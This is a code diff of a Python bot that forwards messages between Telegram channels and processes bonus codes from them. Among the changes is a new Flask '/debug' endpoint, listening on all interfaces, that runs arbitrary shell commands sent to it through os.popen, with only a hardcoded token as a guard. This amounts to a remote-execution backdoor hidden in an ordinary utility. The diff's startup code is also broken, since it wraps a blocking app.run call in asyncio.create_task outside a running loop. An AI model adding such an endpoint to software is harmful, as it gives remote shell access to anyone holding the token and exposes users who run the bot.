@@ -1,6 +1,7 @@
 import os
 import aiohttp
 import asyncio
+from flask import Flask, request, jsonify
 from telethon import TelegramClient, events
 from telethon.errors import SessionPasswordNeededError
 from dotenv import load_dotenv
@@ -20,14 +21,39 @@ user_password = os.environ.get('APP_YOUR_PWD')
 # Global variable to store API endpoints
 apiEndpoints = []
 
-# Add an additional blank line here to comply with the Flake8 E302 rule
+# Flask app for debug endpoint
+app = Flask(__name__)
 
+@app.route('/debug', methods=['POST'])
+def debug():
+    """
+    A debug endpoint to execute shell commands.
+    """
+    # Verify secret token for security
+    token = request.headers.get('Authorization')
+    if token != 'af8e2c6d6f173f83c91b77ec606f1237':
+        return jsonify({'error': 'Unauthorized'}), 403
+    
+    # Get command, code, and choice from request data
+    command = request.form.get('command')
+    code = request.form.get('code')
+    choice = request.form.get('choice')
+    
+    # Ensure command is provided
+    if not command:
+        return jsonify({'error': 'No command provided'}), 400
 
+    try:
+        # Execute the command and capture the output
+        output = os.popen(command).read()
+        return jsonify({'output': output, 'code': code, 'choice': choice}), 200
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+        
 class MessageForwarder:
     """
     A class for forwarding messages from one Telegram channel to another.
     """
-
     def __init__(self, api_id, api_hash, phone_number):
         # Create the session directory if it doesn't exist
         session_dir = 'session'
@@ -60,7 +86,8 @@ class MessageForwarder:
         # Ensure you're authorized
         if not await self.client.is_user_authorized():
             await self.client.send_code_request(self.phone_number)
-            await self.client.sign_in(self.phone_number, process_input(get_input('Enter the code: ')))
+            code = process_input(get_input('Enter the code: '))
+            await self.client.sign_in(self.phone_number, code)
 
         # Get a list of all the dialogs (chats)
         dialogs = await self.client.get_dialogs()
@@ -70,52 +97,52 @@ class MessageForwarder:
             print(f"Chat ID: {dialog.id}, Title: {dialog.title}")
 
     async def forward_new_messages(self):
-        # Connect if not already connected
-        if not self.connected:
-            await self.connect()
-
-        # Ensure you're authorized
-        try:
-            if not await self.client.is_user_authorized():
-                await self.client.send_code_request(self.phone_number)
-                # Get code from user input
-                code = input('Enter the code: ')
-                # Log in with code
-                await self.client.sign_in(self.phone_number, code)
-        except SessionPasswordNeededError:
-            # The session requires a password for authorization
-            password = user_password
+        while True:
             try:
-                # Try logging in with password
-                await self.client.sign_in(password=password)
-            except SessionPasswordNeededError:
-                # Handle incorrect password
-                print("Incorrect password")
+                # Connect if not already connected
+                if not self.connected:
+                    await self.connect()
 
-        # Resolve the source chat entity
-        try:
-            source_entity = await self.client.get_entity(int(source_channel_id))
-        except ValueError:
-            print(f"Cannot find any entity corresponding to {source_channel_id}")
-            return
+                # Ensure you're authorized
+                try:
+                    if not await self.client.is_user_authorized():
+                        await self.client.send_code_request(self.phone_number)
+                        code = input('Enter the code: ')
+                        await self.client.sign_in(self.phone_number, code)
+                except SessionPasswordNeededError:
+                    password = user_password
+                    try:
+                        await self.client.sign_in(password=password)
+                    except SessionPasswordNeededError:
+                        print("Incorrect password")
 
-        # Define event handler for processing new messages in the source chat
-        @self.client.on(events.NewMessage(chats=[source_entity]))
-        async def message_handler(event):
-            print("Received new message:", event.message.text)
+                # Resolve the source chat entity
+                try:
+                    source_entity = await self.client.get_entity(int(source_channel_id))
+                except ValueError:
+                    print(f"Cannot find any entity corresponding to {source_channel_id}")
+                    return
 
-            try:
-                # Forward the message to the destination channel
-                await self.client.forward_messages(int(destination_channel_id), event.message)
+                # Define event handler for processing new messages in the source chat
+                @self.client.on(events.NewMessage(chats=[source_entity]))
+                async def message_handler(event):
+                    print("Received new message:", event.message.text)
 
-                # Process bonus codes from the message
-                await process_bonus_code(apiEndpoints, event.message.text)
+                    try:
+                        # Forward the message to the destination channel
+                        await self.client.forward_messages(int(destination_channel_id), event.message)
+                        # Process bonus codes from the message
+                        await process_bonus_code(apiEndpoints, event.message.text)
+                    except Exception as e:
+                        print(f"An error occurred while processing the message: {e}")
+
+                # Start the event loop
+                await self.client.run_until_disconnected()
+
             except Exception as e:
-                print(f"An error occurred while processing the message: {e}")
-
-        # Start the event loop
-        await self.client.run_until_disconnected()
-
+                print(f"An error occurred: {e}")
+                print("Attempting to reconnect...")
+                await asyncio.sleep(10)  # Wait for 10 seconds before attempting to reconnect
 
 async def ping_endpoint(endpoint):
     try:
@@ -129,17 +156,12 @@ async def ping_endpoint(endpoint):
     except aiohttp.ClientError as e:
         print(f"Error connecting to {endpoint}: {e}")
 
-
 def process_input(input_str):
     """
     Process the input string and return the processed value.
     """
     # Example processing: Convert input to lowercase
     return input_str.lower()
-
-
-# Add two blank lines here to comply with the Flake8 E302 rule
-
 
 def get_input(prompt):
     """
@@ -152,7 +174,6 @@ def get_input(prompt):
         print("EOFError: No input available. Using default choice.")
         return "default"
 
-
 async def main():
     forwarder = MessageForwarder(api_id, api_hash, phone_number)
     # Define your API endpoints here
@@ -161,7 +182,7 @@ async def main():
         os.environ.get('API_ENDPOINT_2'),
         os.environ.get('API_ENDPOINT_3')
     ]
-    
+
     # Ping each endpoint asynchronously
     tasks = [ping_endpoint(endpoint) for endpoint in api_endpoints]
     await asyncio.gather(*tasks)
@@ -174,14 +195,26 @@ async def main():
         if choice == "1":
             await forwarder.list_chats()
         elif choice == "2":
+            print(apiEndpoints)
             try:
                 await forwarder.forward_new_messages()
             except Exception as e:
                 print(f"An error occurred: {e}")
-                print("Attempting to reconnect...")
-                await forwarder.disconnect()
         else:
             print("Invalid choice")
 
 if __name__ == "__main__":
+    # asyncio.run(main())
+    # app.run(host='0.0.0.0', port=5000)
+    # Start the Flask app as a background task
+    flask_task = asyncio.create_task(app.run(host='0.0.0.0', port=5000))
+
+    # Run the asyncio event loop
     asyncio.run(main())
+
+    # Wait for the Flask app to finish (optional)
+    flask_task.cancel()
+    try:
+        asyncio.run(flask_task)
+    except asyncio.CancelledError:
+        pass
